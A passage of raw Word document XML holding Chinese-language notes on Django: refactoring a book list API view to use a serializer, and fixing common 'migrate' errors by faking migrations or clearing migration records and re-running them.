          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>转换为</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>str</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D93A0B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json_str = req_data.decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2388D02A"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将</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>字符串转换</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A6ACB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req_dict = json.loads(json_str)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3C603D"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获取</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>btitle</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>bpub_date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A44DEC0"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btitle = req_dict.get('btitle')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F223661"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bpub_date = req_dict.get('bpub_date')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8CFDC8"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TODO: </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>省略参数校验过程</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11F0B3A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2. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>创建图书信息并添加进数据表中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A27F663"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 = BookInfo.objects.create(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A24181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btitle=btitle,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65BC37CA"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bpub_date=bpub_date</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00B524A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404B5C67"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3. </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>返回新增的图书的</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据，状态码</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>: 201</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2624B76F"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将</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>book</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对象转换成</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>dict</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699DDE5C"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book_dict = {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="686862BC"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'id': book.id,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A0B50B"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'btitle': book.btitle,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4E2C4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'bpub_date': book.bpub_date,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="410686D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'bread': book.bread,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32701CDB"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'bcomment': book.bcomment,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="120FD83A"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'image': book.image.url if book.image else ''</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04E6D44F"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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="266B86C2"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return JsonResponse(book_dict, status=201)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061D92D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lastRenderedPageBreak/>
        <w:t>修改之后：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37967408"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class BookListView(View):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21EE2668"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def get(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484432E8"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books = BookInfo.objects.all() # QuerySet</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B61C0ED"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serializer = BookInfoSerializer(books, many=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70332B5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return JsonResponse(serializer.data, safe=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7612DADB"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def post(self, request):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C63088E"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req_data = request.body # bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4C1950"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json_str = req_data.decode()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1873D0DB"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req_dict = json.loads(json_str)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E201D47"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serializer = BookInfoSerializer(data=req_dict)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210FFDB8"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serializer.is_valid(raise_exception=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D8535E9"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 </w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>反序列化</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>数据保存</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>新增</w:t>
      </w:r>
      <w:r w:rsidRPr="00652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>) -&gt; create</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A722314" w14:textId="77777777" w:rsidR="00870C85"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serializer.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C8888F" w14:textId="17171444" w:rsidR="00B61AC7" w:rsidRPr="00652128" w:rsidRDefault="00870C85" w:rsidP="006521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652128">
        <w:rPr>
          <w:rFonts w:ascii="var(--monospace)" w:eastAsia="宋体" w:hAnsi="var(--monospace)" w:cs="宋体"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">        return JsonResponse(serializer.data, status=201)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="760BC844" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00BC6A81" w:rsidRDefault="00B61AC7" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BC6A81">
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="222226"/>
          <w:kern w:val="36"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>Django迁移错误migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0EDFCD" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="7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t>Django迁移之migrate问题:table xx already exist</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EAC8220" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="300" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>前面我们说到了makemigrations是将models.py里的模型生成一个迁移脚本【也就是migration文件】，下一步则是通过migrate命令来在数据库中生成表，这个步骤中往往也会遇到大大小小的问题。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B0910D8" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="5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t>一、migrate命令原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D7F4D3"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1.1 执行的操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28D831FF" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="300" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>要解决问题，需要知道命令到底执行了些什么操作：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0902DA55" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>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F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>migrate 将相关的迁移脚本翻译成SQL语句，然后在数据库中执行该语句</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D7EA86C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="44"/>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F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>若该SQL语句执行没有问题，那么就会将这个迁移脚本的名字记录到django_migrations表中</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F102442"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1.2 判断执行条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="794BB677" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="001E2D06">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="340" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>那么如何判断哪些迁移脚本要执行呢？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68A3DFCD" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="001E2D06">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:line="34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migrate会将代码中的迁移脚本和数据库中的django_migrations 中的迁移脚本进行对比，如果发现数据库中，没有这个迁移脚本，那么就会执行这个迁移脚本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71CD9CF4" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="5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lastRenderedPageBreak/>
        <w:t>二、migrate命令报错原理</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="780B228A"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原因：数据库的django_migrations 表中的迁移版本记录和代码中的迁移脚本不一致导致的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D5B7ED0" w14:textId="77777777" w:rsidR="001E2D06"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常见错误示例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E390988" w14:textId="7A1CB8F7" w:rsidR="00B61AC7" w:rsidRPr="001E2D06" w:rsidRDefault="00B61AC7" w:rsidP="001E2D06">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1E2D06">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>table xx already exist</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D2F9AEB" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:after="240" w:line="5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t>三、 解决方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36571485"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1、方法1: --fake参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45BB026A"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这一个参数是用于，将已经创立的表的迁移操作隐藏，即将代码中的迁移脚本添加到django_migrations中，但并不执行SQL语句，避免每次执行migrate的时候，都执行一些重复的迁移脚本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32587D04" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">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python manage.py migrate app_name --fake</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C0DA7F"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再正常执行迁移映射操作即可</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C8AFE06"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2、方法2: 简单粗暴法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3FF562"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这一步如其名一样简单，删除了所有相关迁移脚本和迁移记录后，重新完全迁移。！！！需要保持数据库和模型字段一致！！！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB59C32" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="300"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>删除migration文件夹下，除____pycache____和____init____之外的所有文件【即迁移脚本】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25362413" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="300"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>删除数据库中，相关字段的所有信息</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2912B4C3" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>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left="295" w:hanging="357"/>
        <w:contextualSpacing/>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delete from django_migrations where app = app_name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DAD57BC" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>
        </w:numPr>
        <w:spacing w:after="300" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="295" w:hanging="357"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F500E7">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>重新执行迁移操作</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E0B984C" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="00F500E7" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>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left="295" w:hanging="357"/>
        <w:contextualSpacing/>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python manage.py makemigrations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20F6C16F" w14:textId="46F2DEBC" w:rsidR="00B61AC7" w:rsidRPr="00652128" w:rsidRDefault="00B61AC7" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="45"/>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left="300"/>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python manage.py migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35678B9A" w14:textId="54D4631E" w:rsidR="00B61AC7" w:rsidRPr="00652128" w:rsidRDefault="00652128" w:rsidP="00652128">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122</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:hyperlink r:id="rId145" w:history="1">
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00652128">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="34"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>django</w:t>
        </w:r>
        <w:r w:rsidR="00B61AC7" w:rsidRPr="00652128">
          <w:rPr>
            <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
            <w:b/>
            <w:bCs/>
            <w:color w:val="333333"/>
            <w:kern w:val="0"/>
            <w:sz w:val="34"/>
            <w:szCs w:val="34"/>
          </w:rPr>
          <w:t>迁移数据库错误</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="15612"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5072"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B61AC7" w:rsidRPr="002101A1" w14:paraId="318554B9" w14:textId="77777777" w:rsidTr="00652128">
        <w:trPr>
          <w:trHeight w:val="712"/>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0636956"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0CCF2A4"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django.db.migrations.graph.NodeNotFoundError: Migration order.0002_auto_20181209_0031 dependencies reference nonexistent parent node ('user', '0001_initial')</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="630FFA32" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="002101A1"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 xml:space="preserve">　　删除所有的</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>pyc</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>文件，迁移文件</w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="002101A1">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>然后重新运行</w:t>
